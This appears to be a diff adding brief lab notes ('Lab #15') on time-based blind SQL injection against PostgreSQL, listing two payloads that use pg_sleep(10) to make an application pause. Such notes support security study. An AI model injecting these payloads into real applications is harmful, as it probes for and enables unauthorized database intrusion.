@@ -1,0 +1,5 @@
+Lab #15: 
+
+1. Causing the application to sleep
+'; select pg_sleep(10)--
+'||pg_sleep(10)--
